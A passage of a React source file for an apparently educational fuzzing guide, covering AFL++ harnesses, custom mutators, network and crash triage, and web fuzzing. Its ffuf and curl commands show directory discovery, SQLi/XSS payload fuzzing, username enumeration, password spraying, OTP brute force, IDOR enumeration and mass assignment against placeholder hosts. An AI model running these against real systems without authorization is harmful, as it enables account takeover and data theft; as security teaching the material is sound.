    content: "Persistent mode keeps the target process alive between test cases, avoiding fork() overhead for massive speedups. In traditional fuzzing, each test input causes a new process to be forked and executed—this is safe (crashes don't affect the fuzzer) but slow due to process creation overhead. Persistent mode changes this by processing multiple inputs in a single process invocation, resetting state between inputs through a loop. The speedup can be dramatic: from 1,000 executions per second in fork mode to 100,000+ in persistent mode—a 100x improvement! However, persistent mode requires careful harness design. Your target must cleanly reset its state between inputs: no accumulated data, no leaked resources, no gradually corrupting global state. If state accumulates, bugs might only appear after processing many inputs, making them hard to reproduce. The deferred initialization (__AFL_INIT()) further optimizes startup by delaying the fork point until after expensive one-time setup. For libFuzzer, persistent mode is the default—each call to LLVMFuzzerTestOneInput processes one input without forking. For AFL++, you use special macros (__AFL_LOOP, __AFL_INIT) to implement the persistent loop manually.",
    code: `// AFL++ persistent mode harness
#include <unistd.h>
#include <string.h>

// Tell AFL to instrument this file
__AFL_FUZZ_INIT();

// Global state that persists (initialize once)
static Parser *parser = NULL;

int main() {
    // Expensive one-time initialization happens before fork
    parser = parser_create();
    if (!parser) return 1;

    // Deferred initialization - the fork() happens HERE
    // Everything before this runs once; everything after runs per-input
    __AFL_INIT();

    // Get pointer to shared memory input buffer (faster than reading files)
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;

    // Persistent loop - process stays alive between inputs
    // The argument (10000) is how many inputs before respawning
    while (__AFL_LOOP(10000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;

        // Parse the fuzz input
        ParseResult *result = parser_parse(parser, buf, len);

        // Use the result (exercise more code)
        if (result) {
            result_validate(result);
            result_free(result);
        }

        // CRITICAL: Reset any state accumulated during this iteration
        parser_reset(parser);  // Clear cached data
        // Don't: free(parser) - we reuse it!
    }

    // Cleanup after all iterations
    parser_destroy(parser);
    return 0;
}`,
    tip: "Persistent mode can increase execution speed from 1,000 to 100,000+ execs/sec! Always verify your harness resets state correctly by running the same input twice and checking for identical behavior.",
    warning: "Ensure your target doesn't leak memory or accumulate state between iterations. Use valgrind or ASan to check for leaks in your persistent harness. A leaking harness will eventually crash or produce unreproducible bugs.",
  },
  {
    title: "Custom Mutators",
    icon: <CodeIcon />,
    content: "When default mutations aren't effective, custom mutators can leverage format knowledge for smarter fuzzing. Default mutation strategies (bit flips, byte replacements, havoc) work well for binary data but struggle with structured formats where random changes usually produce invalid inputs rejected early by parsers. Custom mutators allow you to implement format-aware mutations that change inputs while keeping them syntactically valid—or at least 'almost valid' in interesting ways. For example, a custom mutator for SQL could swap operators (= to !=), duplicate clauses (adding extra UNIONs), or inject known-dangerous patterns while maintaining SQL syntax. AFL++ supports custom mutators as shared libraries that export specific functions (afl_custom_fuzz, afl_custom_havoc_mutation). You can also use Python mutators for rapid prototyping. The key is finding the right balance: too constrained and you miss bugs in error handling; too random and you waste time on obviously invalid inputs. Start with the default mutators, analyze which inputs the fuzzer saves as interesting, and design custom mutations that produce more inputs like those.",
    code: `// AFL++ custom mutator example (Python)
import struct
import random

def init(seed):
    """Called once when the mutator is loaded"""
    random.seed(seed)
    return 0

def fuzz(buf, add_buf, max_size):
    """Called for each mutation - return mutated data"""
    if len(buf) < 8:
        return buf  # Too small to parse, return unchanged

    # Parse the input as our custom binary format
    # Format: [4-byte magic][4-byte length][payload]
    magic = buf[:4]
    length = struct.unpack("<I", buf[4:8])[0]
    payload = buf[8:]

    # Mutation strategy: 30% chance to fuzz length field
    if random.random() < 0.3:
        # Try interesting length values
        new_len = random.choice([
            0,              # Zero length
            len(payload),   # Exact match
            len(payload) + 1,  # Off by one
            len(payload) * 2,  # Double
            0xFFFFFFFF,     # Max u32
            0x7FFFFFFF,     # Max i32
        ])
        return magic + struct.pack("<I", new_len) + payload

    # 20% chance: corrupt magic bytes (test magic validation)
    if random.random() < 0.2:
        corrupted_magic = bytearray(magic)
        corrupted_magic[random.randint(0, 3)] ^= random.randint(1, 255)
        return bytes(corrupted_magic) + buf[4:]

    # 50% chance: return unchanged (let AFL++ do default mutations)
    return buf

def describe(max_description_length):
    """Return description of this mutator"""
    return "Custom binary format mutator"

# Save as custom_mutator.py and use with:
# AFL_CUSTOM_MUTATOR_LIBRARY=./custom_mutator.so \\
#   afl-fuzz -i in/ -o out/ -- ./target @@`,
    points: [
      "Structure-aware: Mutate specific fields while keeping format valid enough to reach deep code",
      "Protocol-aware: Generate valid protocol messages with fuzzed payloads in the right places",
      "Grammar-based: Use grammar rules to generate syntactically valid but semantically interesting inputs",
      "Combine with coverage: Let the fuzzer guide which mutations to keep based on code coverage",
      "Python for prototyping: Rapidly iterate on mutation strategies before optimizing in C",
      "Preprocessing: Transform inputs before fuzzing (decompress, decrypt, decode) and reverse after",
    ],
  },
  {
    title: "Fuzzing Network Services",
    icon: <HttpIcon />,
    content: "Network fuzzing requires special techniques to handle state, timing, and connectivity. Unlike file-based fuzzing where input is a simple byte array, network services expect connections, handshakes, and often multi-message conversations. The simplest approach is 'desocketing'—redirecting network calls to read from stdin or a file instead. This transforms a network service into a file-parsing target that standard fuzzers can test. AFL++'s desock library and preeny make this easy for many targets. For more complex scenarios, you need protocol-aware fuzzing with tools like boofuzz that understand session state: they can establish connections, perform authentication, and then fuzz subsequent messages while maintaining valid session state. Some network protocols are inherently stateful—the response to message N depends on messages 1 through N-1. Fuzzing these requires either capturing and replaying valid session prefixes or implementing protocol state machines that the fuzzer navigates. Modern tools like AFLNet combine coverage-guided fuzzing with protocol state inference to explore network services systematically.",
    code: `# Method 1: Desocketing - Redirect network calls to stdin/stdout
# Compile with afl-clang-fast and link desock library
afl-clang-fast -o target target.c $(pkg-config --libs desock)

# Or use preload method (no recompilation needed)
AFL_PRELOAD=/usr/lib/libdesock.so afl-fuzz -i in/ -o out/ -- ./server

# Method 2: Use AFLNet for stateful protocol fuzzing
# AFLNet maintains protocol state and sends message sequences
aflnet-fuzz -i seeds/ -o out/ -N tcp://127.0.0.1/8080 \\
    -P HTTP -D 10000 -q 3 -s 3 -E -K -- ./http_server

# Method 3: boofuzz for custom protocol fuzzing
from boofuzz import *

session = Session(
    target=Target(
        connection=TCPSocketConnection("127.0.0.1", 8080)
    ),
    sleep_time=0.1,  # Delay between test cases
)

# Define protocol structure
s_initialize("http-request")
s_string("GET", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("/index.html", name="path")  # Fuzz this
s_delim(" ", fuzzable=False)
s_string("HTTP/1.1", fuzzable=False)
s_static("\\r\\nHost: target.com\\r\\n\\r\\n")

session.connect(s_get("http-request"))
session.fuzz()  # Start fuzzing`,
    warning: "Always fuzz in isolated environments. Network fuzzing can affect other systems on your network! Use VMs, containers, or isolated network namespaces.",
    points: [
      "Desocketing: Fastest option—transform network service into stdin-reading program",
      "Protocol-aware: boofuzz, AFLNet, and Peach understand protocol structure and state",
      "Capture real traffic: Use tcpdump/Wireshark to create seed inputs from production traffic",
      "Mock dependencies: Replace external services with deterministic stubs for reproducibility",
      "Handle timing: Network code often has timeouts—use short timeouts during fuzzing",
      "Concurrent connections: Test multi-client scenarios for race conditions",
    ],
  },
  {
    title: "Crash Triage & Analysis",
    icon: <BugReportIcon />,
    content: "Finding crashes is only the beginning. Triage helps prioritize and understand each bug. After a fuzzing campaign, you might have hundreds or thousands of crash-inducing inputs. Most of these will be duplicates—different inputs triggering the same underlying bug. Crash triage is the process of grouping crashes by root cause, minimizing inputs for easier analysis, and assessing the severity of each unique bug. Start by deduplicating crashes using stack hash techniques: AFL++ and libFuzzer group crashes by their unique stack traces, but this can both under-group (same bug with different call stacks) and over-group (different bugs with similar stacks). Manual review of unique crashes is usually necessary. Once you have unique crashes, minimize them using afl-tmin or libFuzzer's -minimize_crash flag—this removes bytes that aren't necessary to trigger the crash, making root cause analysis easier. For each minimized crash, determine its type (buffer overflow, use-after-free, null dereference, etc.) using ASan output and debugger analysis. Assess exploitability: can an attacker control the crash to achieve code execution, information disclosure, or denial of service? Tools like GDB's exploitable plugin help with initial assessment, but thorough exploitability analysis requires security expertise.",
    code: `# Step 1: Deduplicate crashes by stack hash
afl-collect -r findings/crashes/ unique_crashes/ -- ./target @@
echo "Found $(ls unique_crashes/ | wc -l) unique crashes"

# Step 2: Analyze each crash with AddressSanitizer
for crash in unique_crashes/*; do
    echo "=== Analyzing $crash ==="
    ASAN_OPTIONS="symbolize=1" ./target_asan < "$crash" 2>&1 | head -50
done

# Step 3: Minimize crash inputs for easier analysis
for crash in unique_crashes/*; do
    afl-tmin -i "$crash" -o "minimized/$(basename $crash)" -- ./target @@
done

# Step 4: Get exploitability assessment (GDB + exploitable plugin)
gdb -batch -ex "run < minimized/crash1" \\
    -ex "exploitable" \\
    -ex "bt full" \\
    ./target

# Step 5: Create reproducible test case
cat > repro_crash1.sh << 'EOF'
#!/bin/bash
# Reproduces CVE-XXXX-YYYY (buffer overflow in parse_header)
./target < crash_minimized
EOF

# Step 6: Document for bug report
echo "Crash Summary:" > crash_report.md
echo "- Type: Heap buffer overflow (ASan: heap-buffer-overflow)" >> crash_report.md
echo "- Location: src/parser.c:142 in parse_header()" >> crash_report.md
echo "- Trigger: Malformed header with length > 1024" >> crash_report.md`,
    points: [
      "Stack hash deduplication: Group crashes by unique stack traces using afl-collect or afl-cov",
      "Input minimization: Reduce crash input to essential bytes with afl-tmin for easier debugging",
      "Exploitability assessment: Determine if crash is security-relevant (arbitrary write, RCE potential)",
      "Root cause analysis: Use debugger + sanitizer output to understand exactly what went wrong",
      "CVE check: Compare against known vulnerabilities and existing bug reports to avoid duplicates",
      "Bisection: Find which commit introduced the bug using git bisect with your crash input",
      "Report writing: Document the vulnerability clearly with reproduction steps and impact analysis",
    ],
  },
];

const webFuzzingSections: TopicSection[] = [
  {
    title: "Directory & File Discovery",
    icon: <StorageIcon />,
    content: "Discover hidden endpoints, backup files, and forgotten admin panels that expand your attack surface. Web applications often contain files and directories that aren't linked from the main application but are still accessible—configuration files, backup copies, admin interfaces, API documentation, and development artifacts. These hidden resources frequently contain sensitive information or provide privileged functionality that attackers can exploit. Directory fuzzing (also called directory brute-forcing or content discovery) systematically requests URLs constructed from wordlists to find these hidden resources. The technique is simple but powerful: request /admin, /backup, /config, /.git, and thousands of other common paths, noting which return valid responses. Modern tools like ffuf, gobuster, and feroxbuster make this fast and efficient, supporting features like filtering by response size/code, recursive scanning, and concurrent requests. The key to effective directory fuzzing is using quality wordlists appropriate for your target. Generic wordlists find common paths, but technology-specific lists (PHP, ASP.NET, WordPress) and target-specific lists (derived from JavaScript analysis or wayback machine) find application-specific endpoints. Don't forget file extensions—many developers leave backup files (.bak, .old, ~), source files (.php.txt, .asp.bak), and configuration files (.env, .git/config) exposed.",
    code: `# Basic directory fuzzing with ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Multiple extensions - find backup files and source code
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.bak,.old,.txt,.zip,.env,.config

# Recursive scanning - go deeper into discovered directories
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -v

# Filter by size/words/lines to reduce noise (hide empty pages)
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 0 -fw 1 -mc 200,301,302,403

# Virtual host discovery - find hidden subdomains
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0

# API endpoint discovery
ffuf -u https://api.target.com/v1/FUZZ -w /usr/share/wordlists/api/api-endpoints.txt

# Combined with rate limiting for stealth
ffuf -u https://target.com/FUZZ -w wordlist.txt -rate 50 -t 10`,
    points: [
      "Use quality wordlists: SecLists, OneListForAll, Assetnote wordlists, custom lists from recon",
      "Try multiple extensions: .bak, .old, .swp, .git, .env, .config, .DS_Store, .htaccess",
      "Check for backups: admin.php.bak, index.php~, .htaccess.old, database.sql.gz",
      "API paths: /api/v1/, /api/internal/, /swagger.json, /graphql, /openapi.yaml",
      "Development files: /debug, /test, /staging, /.git/HEAD, /phpinfo.php",
      "Filter wisely: Remove false positives by size, word count, or response code patterns",
      "Respect rate limits: Too aggressive = blocked; too slow = never finishes",
    ],
  },
  {
    title: "Parameter Fuzzing",
    icon: <HttpIcon />,
    content: "Discover hidden parameters and test existing ones for injection vulnerabilities. Beyond visible form fields and URL parameters, web applications often accept hidden parameters that enable debug modes, bypass authentication, or expose internal functionality. Parameter discovery fuzzing tries common parameter names (debug, test, admin, internal, id, user, token) to find these hidden inputs. Once you've identified parameters (visible or hidden), the next step is testing them for vulnerabilities by injecting payloads: SQL injection (quotes, UNION, OR 1=1), XSS (script tags, event handlers), command injection (semicolons, pipes, backticks), and more. Modern parameter fuzzing goes beyond simple value substitution—you should test parameter pollution (same parameter twice with different values), type juggling (replacing strings with arrays or objects), and encoding variations (double encoding, unicode). Tools like ffuf and Burp Suite Intruder excel at this, letting you mark injection points and cycle through payload wordlists. Watch for both direct indicators (error messages, changed behavior) and indirect indicators (timing differences for blind injection, out-of-band callbacks for blind XSS/SSRF).",
    code: `# Discover GET parameters - find hidden params
ffuf -u "https://target.com/page?FUZZ=test" -w params.txt -fs 0

# Fuzz POST parameters - test form fields
ffuf -u https://target.com/login -X POST \\
     -d "username=admin&FUZZ=test" -w params.txt \\
     -H "Content-Type: application/x-www-form-urlencoded"

# Test for SQL injection in known parameter
ffuf -u "https://target.com/search?q=FUZZ" \\
     -w /usr/share/wordlists/wfuzz/Injections/SQL.txt \\
     -fr "error|exception|syntax|mysql|sqlite|postgresql"

# Test for XSS
ffuf -u "https://target.com/profile?name=FUZZ" \\
     -w /usr/share/wordlists/wfuzz/Injections/XSS.txt \\
     -mr "<script|onerror|javascript:"

# JSON body fuzzing for APIs
ffuf -u https://target.com/api/user \\
     -X POST -H "Content-Type: application/json" \\
     -d '{"id":"FUZZ","role":"user"}' -w ids.txt

# Parameter pollution - send same param twice
curl "https://target.com/transfer?amount=100&to=attacker&amount=1000000"`,
    points: [
      "Hidden params: debug, test, admin, internal, token, callback, redirect, url, file, cmd",
      "Parameter pollution: Try same param twice with different values—backends handle this inconsistently",
      "Type juggling: Replace strings with arrays, ints, objects, null—PHP type juggling is notorious",
      "Injection payloads: SQLi, XSS, SSTI, command injection, path traversal wordlists",
      "Watch for timing: Blind injection may only show in response time (SQL SLEEP, command sleep)",
      "Out-of-band: Use Burp Collaborator or interactsh for blind SSRF, XXE, XSS detection",
      "Encoding bypass: URL encoding, double encoding, unicode, HTML entities to bypass filters",
    ],
  },
  {
    title: "Authentication Fuzzing",
    icon: <SecurityIcon />,
    content: "Test login systems, password reset flows, and session handling for weaknesses. Authentication is one of the most critical attack surfaces in any web application—a bypass here gives attackers full access to user accounts. Authentication fuzzing covers several techniques: username enumeration (detecting valid usernames through different error messages or response times), password spraying (trying common passwords against many users), brute force (trying many passwords against one user), and logic testing (bypassing MFA, abusing password reset, session fixation). Username enumeration is often the first step—applications frequently reveal whether a username exists through different error messages ('Invalid username' vs 'Invalid password'), different response times (database lookup only happens for valid users), or different HTTP response codes. Once you have valid usernames, password spraying is more effective than brute force: try a small list of common passwords against many accounts rather than many passwords against one account, which triggers lockouts. Always check for authentication bypass vulnerabilities: default credentials, password reset token prediction, MFA bypass through parameter tampering, and session fixation. Modern applications should use rate limiting, account lockout, and CAPTCHA, but implementation flaws are common.",
    code: `# Username enumeration (different response for valid/invalid users)
ffuf -u https://target.com/login -X POST \\
     -d "username=FUZZ&password=wrongpassword123" -w usernames.txt \\
     -H "Content-Type: application/x-www-form-urlencoded" \\
     -fr "Invalid password"  # Filter responses containing this (means user exists!)

# Alternative: look for timing differences
ffuf -u https://target.com/login -X POST \\
     -d "username=FUZZ&password=wrongpassword123" -w usernames.txt \\
     -H "Content-Type: application/x-www-form-urlencoded" \\
     -ft ">500"  # Filter by response time to find slow responses (user exists)

# Password spraying (few passwords, many users - avoids lockout)
ffuf -u https://target.com/login -X POST \\
     -d "username=USER&password=PASS" \\
     -w users.txt:USER -w common_passwords.txt:PASS \\
     -mode clusterbomb -rate 10  # Slow to avoid detection

# OTP/2FA bypass attempts - brute force short codes
ffuf -u https://target.com/verify -X POST \\
     -d "code=FUZZ" -w <(seq -w 0000 9999) \\
     -H "Cookie: session=abc123" \\
     -rate 100  # May trigger lockout

# Test password reset token prediction
ffuf -u "https://target.com/reset?token=FUZZ" \\
     -w tokens.txt -mc 200`,
    warning: "Respect rate limits and lockout policies. Brute forcing without authorization is illegal! Only test systems you have explicit permission to attack.",
    tip: "Look for response differences: size, time, headers, error messages to identify valid credentials. Even a 1-byte difference or 50ms timing gap can reveal information.",
  },
  {
    title: "API Fuzzing",
    icon: <HttpIcon />,
    content: "Modern applications expose APIs that often lack the same security controls as web interfaces. REST APIs, GraphQL endpoints, and microservice interfaces frequently have weaker authentication, less input validation, and more permissive CORS policies than user-facing web pages. API fuzzing tests these interfaces systematically: discovering undocumented endpoints, testing for IDOR (Insecure Direct Object Reference) by manipulating IDs, checking authorization by accessing resources as different users, and injecting payloads into JSON/XML bodies. Start by mapping the API surface: look for swagger.json, openapi.yaml, or GraphQL introspection queries that reveal available endpoints. Then fuzz for undocumented endpoints using common API path patterns. IDOR testing is crucial—APIs often use predictable resource IDs that let attackers access other users' data simply by changing the ID parameter. Test both horizontal access (user A accessing user B's data) and vertical access (regular user accessing admin functions). HTTP method fuzzing is also valuable: an endpoint might reject GET but allow PUT or DELETE, or respond differently to OPTIONS requests. For GraphQL, test for excessive data exposure through introspection and field-level authorization bypasses.",
    code: `# Discover API version endpoints
ffuf -u https://api.target.com/v{FUZZ}/users -w <(seq 1 10)
ffuf -u https://api.target.com/api/vFUZZ/users -w <(seq 1 10)

# IDOR testing - enumerate IDs to find accessible resources
ffuf -u https://api.target.com/users/FUZZ -w <(seq 1 10000) -mc 200

# IDOR with UUID prediction (rare but happens)
ffuf -u https://api.target.com/users/FUZZ \\
     -w known_uuids.txt -mc 200

# HTTP method fuzzing - find verb tampering issues
ffuf -u https://api.target.com/users/1 -X FUZZ \\
     -w <(echo -e "GET\\nPOST\\nPUT\\nPATCH\\nDELETE\\nOPTIONS\\nTRACE") \\
     -mc all -fc 405

# GraphQL introspection - discover schema
curl -X POST -H "Content-Type: application/json" \\
     -d '{"query":"query{__schema{types{name fields{name}}}}"}' \\
     https://target.com/graphql

# GraphQL fuzzing with custom queries
ffuf -u https://target.com/graphql -X POST \\
     -H "Content-Type: application/json" \\
     -d '{"query":"FUZZ"}' -w graphql-payloads.txt

# JSON body manipulation - add extra fields (mass assignment)
curl -X POST -H "Content-Type: application/json" \\
     -d '{"username":"test","email":"test@test.com","role":"admin","isAdmin":true}' \\
     https://api.target.com/register`,
    points: [
      "Endpoint discovery: /api/, /v1/, /v2/, /internal/, /private/, swagger.json, openapi.yaml",
      "IDOR testing: Sequential IDs, UUIDs, encoded values—access other users' data by changing identifiers",
      "Mass assignment: Add extra fields in POST/PUT requests (role, isAdmin, verified) that shouldn't be user-controlled",
      "Rate limit bypass: Different headers (X-Forwarded-For), IP rotation, encoded paths, case variations",
      "Auth bypass: Remove tokens, use default/null values, test JWT manipulation (alg:none, weak secrets)",
      "GraphQL-specific: Introspection, batching attacks, field-level authorization, nested query DoS",
      "Version confusion: Old API versions may lack security fixes present in newer versions",
    ],
  },
];

export default function FuzzingGuidePage() {
  const theme = useTheme();
  const navigate = useNavigate();

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));

  const sectionNavItems = [
    { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
    { id: "fundamentals", label: "Fundamentals", icon: <BugReportIcon /> },
    { id: "setup", label: "Setup & Harnesses", icon: <SettingsIcon /> },
    { id: "advanced", label: "Advanced Techniques", icon: <SpeedIcon /> },
    { id: "web-fuzzing", label: "Web Fuzzing", icon: <WebIcon /> },
    { id: "kernel-fuzzing", label: "Kernel Fuzzing", icon: <MemoryIcon /> },
    { id: "smart-contracts", label: "Smart Contracts", icon: <SecurityIcon /> },
    { id: "coverage", label: "Coverage Analysis", icon: <DataObjectIcon /> },
    { id: "cve-studies", label: "CVE Case Studies", icon: <WarningAmberIcon /> },
    { id: "tools", label: "Tools Reference", icon: <BuildIcon /> },
    { id: "mutations", label: "Mutation Strategies", icon: <AutoFixHighIcon /> },
    { id: "magic-values", label: "Magic Values", icon: <CodeIcon /> },
    { id: "quiz", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  const pageContext = `This page provides a comprehensive guide to fuzzing techniques for security testing. Topics include coverage-guided fuzzing with AFL++ and libFuzzer, building effective fuzz harnesses, mutation strategies (bit flipping, byte replacement, block operations), web application fuzzing with ffuf, creating seed corpuses, and crash triage. The guide covers tools like Honggfuzz, Radamsa, Jazzer, and Atheris for various target types.`;

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCmd(id);
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  // ========== CYBERPUNK STYLED COMPONENTS ==========

  const CodeBlock = ({ code, id }: { code: string; id: string }) => (
    <Box sx={{ position: "relative", mt: 2 }}>
      <Paper
        sx={{
          p: 2,
          bgcolor: "rgba(0, 10, 20, 0.95)",
          borderRadius: 2,
          fontFamily: "'Fira Code', 'Consolas', monospace",
          fontSize: "0.85rem",
          color: cyber.neonGreen,
          overflow: "auto",
          border: `1px solid ${cyber.neonCyan}`,
          boxShadow: `0 0 15px ${alpha(cyber.neonCyan, 0.3)}, inset 0 0 30px ${alpha(cyber.neonCyan, 0.05)}`,
          position: "relative",
          "&::before": {
            content: '"// EXECUTABLE CODE"',
            position: "absolute",
            top: 4,
            left: 12,
            fontSize: "0.65rem",
            color: cyber.neonMagenta,
            opacity: 0.7,
            fontFamily: "'Fira Code', monospace",
          },
        }}
      >
        <pre style={{ margin: 0, whiteSpace: "pre-wrap", wordBreak: "break-all", marginTop: 16 }}>{code}</pre>
      </Paper>
      <Tooltip title={copiedCmd === id ? "COPIED!" : "COPY TO BUFFER"}>
        <IconButton
          size="small"
          onClick={() => handleCopy(code, id)}
          sx={{
            position: "absolute",
            top: 8,
            right: 8,
            color: copiedCmd === id ? cyber.neonGreen : cyber.neonCyan,
            bgcolor: alpha(cyber.darkBg, 0.9),
            border: `1px solid ${copiedCmd === id ? cyber.neonGreen : cyber.neonCyan}`,
            boxShadow: `0 0 10px ${copiedCmd === id ? cyber.neonGreen : cyber.neonCyan}`,
            "&:hover": {
              bgcolor: alpha(cyber.neonCyan, 0.2),
              boxShadow: `0 0 20px ${cyber.neonCyan}`,
            },
          }}
        >
          <ContentCopyIcon fontSize="small" />
        </IconButton>
      </Tooltip>
    </Box>
  );

  const SectionAccordion = ({ section, index }: { section: TopicSection; index: number }) => (
    <Accordion
      defaultExpanded={index === 0}
      sx={{
        bgcolor: alpha(cyber.darkCard, 0.8),
        border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
        borderRadius: "8px !important",
        mb: 2,
        "&:before": { display: "none" },
        overflow: "hidden",
        backdropFilter: "blur(10px)",
        transition: "all 0.3s ease",
        "&:hover": {
          borderColor: cyber.neonCyan,
          boxShadow: `0 0 20px ${alpha(cyber.neonCyan, 0.3)}`,
        },
      }}
    >
      <AccordionSummary
        expandIcon={<ExpandMoreIcon sx={{ color: cyber.neonMagenta }} />}
        sx={{
          "&:hover": {
            bgcolor: alpha(cyber.neonCyan, 0.05),
          },
        }}
      >
        <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
          {section.icon && (
            <Box
              sx={{
                color: cyber.neonCyan,
                filter: `drop-shadow(0 0 8px ${cyber.neonCyan})`,
              }}
            >
              {section.icon}
            </Box>
          )}
          <Typography
            variant="h6"
            sx={{
              fontWeight: 700,
              color: cyber.neonCyan,
              textShadow: `0 0 10px ${alpha(cyber.neonCyan, 0.5)}`,
              fontFamily: "'Orbitron', 'Rajdhani', sans-serif",
              letterSpacing: "0.05em",
            }}
          >
            {section.title}
          </Typography>
        </Box>
      </AccordionSummary>
      <AccordionDetails sx={{ borderTop: `1px solid ${alpha(cyber.neonCyan, 0.2)}` }}>
        <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8, color: alpha("#fff", 0.8) }}>
          {section.content}
        </Typography>

        {section.warning && (
          <Paper
            sx={{
              p: 2,
              mb: 2,
              bgcolor: alpha(cyber.neonPink, 0.1),
              border: `1px solid ${cyber.neonPink}`,
              borderRadius: 2,
              boxShadow: `0 0 15px ${alpha(cyber.neonPink, 0.3)}, inset 0 0 20px ${alpha(cyber.neonPink, 0.1)}`,
            }}
          >
            <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1 }}>
              <WarningAmberIcon sx={{ color: cyber.neonPink, filter: `drop-shadow(0 0 5px ${cyber.neonPink})` }} />
              <Typography variant="body2" sx={{ color: cyber.neonPink, fontWeight: 600 }}>
                {section.warning}
              </Typography>
            </Box>
          </Paper>
        )}

        {section.tip && (
          <Paper
            sx={{
              p: 2,
              mb: 2,
              bgcolor: alpha(cyber.neonGreen, 0.1),
              border: `1px solid ${cyber.neonGreen}`,
              borderRadius: 2,
              boxShadow: `0 0 15px ${alpha(cyber.neonGreen, 0.3)}, inset 0 0 20px ${alpha(cyber.neonGreen, 0.1)}`,
            }}
          >
            <Typography variant="body2" sx={{ color: cyber.neonGreen, fontWeight: 600 }}>
              [TIP] {section.tip}
            </Typography>
          </Paper>
        )}

        {section.points && (
          <Box component="ul" sx={{ pl: 2, mb: 2 }}>
            {section.points.map((point, i) => (
              <Typography
                component="li"
                variant="body2"
                key={i}
                sx={{
                  mb: 1,
                  lineHeight: 1.7,
                  color: alpha("#fff", 0.75),
                  "&::marker": { color: cyber.neonMagenta },
                }}
              >
                {point}
              </Typography>
            ))}
          </Box>
        )}

        {section.code && <CodeBlock code={section.code} id={`section-${index}`} />}

        {section.table && (
          <TableContainer
            component={Paper}
            sx={{
              mt: 2,
              bgcolor: alpha(cyber.darkBg, 0.8),
              border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
              borderRadius: 2,
            }}
          >
            <Table size="small">
              <TableHead>
                <TableRow>
                  {section.table.headers.map((h, i) => (
                    <TableCell
                      key={i}
                      sx={{
                        fontWeight: 700,
                        bgcolor: alpha(cyber.neonCyan, 0.15),
                        color: cyber.neonCyan,
                        borderBottom: `1px solid ${cyber.neonCyan}`,
                        fontFamily: "'Orbitron', sans-serif",
                        fontSize: "0.75rem",
                        letterSpacing: "0.1em",
                      }}
                    >
                      {h}
                    </TableCell>
                  ))}
                </TableRow>
              </TableHead>
              <TableBody>
                {section.table.rows.map((row, i) => (
                  <TableRow
                    key={i}
                    sx={{
                      "&:hover": { bgcolor: alpha(cyber.neonCyan, 0.05) },
                    }}
                  >
                    {row.map((cell, j) => (
                      <TableCell
                        key={j}
                        sx={{
                          fontFamily: j === 0 ? "'Fira Code', monospace" : "inherit",
                          color: j === 0 ? cyber.neonGreen : alpha("#fff", 0.8),
                          borderBottom: `1px solid ${alpha(cyber.neonCyan, 0.2)}`,
                        }}
                      >
                        {cell}
                      </TableCell>
                    ))}
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        )}
      </AccordionDetails>
    </Accordion>
  );

  // Cyberpunk Sidebar Navigation
  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 240,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 2,
        border: `1px solid ${cyber.neonCyan}`,
        bgcolor: alpha(cyber.darkPanel, 0.95),
        backdropFilter: "blur(20px)",
        boxShadow: `0 0 30px ${alpha(cyber.neonCyan, 0.2)}, inset 0 0 50px ${alpha(cyber.neonCyan, 0.05)}`,
        "&::before": {
          content: '""',
          position: "absolute",
          top: 0,
          left: 0,
          right: 0,
          height: "2px",
          background: `linear-gradient(90deg, transparent, ${cyber.neonCyan}, ${cyber.neonMagenta}, transparent)`,
        },
      }}
    >
      <Box sx={{ p: 2, borderBottom: `1px solid ${alpha(cyber.neonCyan, 0.3)}` }}>
        <Typography
          variant="caption"
          sx={{
            fontWeight: 700,
            color: cyber.neonMagenta,
            fontFamily: "'Orbitron', sans-serif",
            letterSpacing: "0.2em",
            textShadow: `0 0 10px ${cyber.neonMagenta}`,
          }}
        >
          SYSTEM PROGRESS
        </Typography>
        <Box sx={{ mt: 1, position: "relative" }}>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 8,
              borderRadius: 1,
              bgcolor: alpha(cyber.neonCyan, 0.1),
              border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
              "& .MuiLinearProgress-bar": {
                bgcolor: cyber.neonCyan,
                boxShadow: `0 0 10px ${cyber.neonCyan}`,
                borderRadius: 1,
              },
            }}
          />
          <Typography
            variant="caption"
            sx={{
              color: cyber.neonCyan,
              mt: 0.5,
              display: "block",
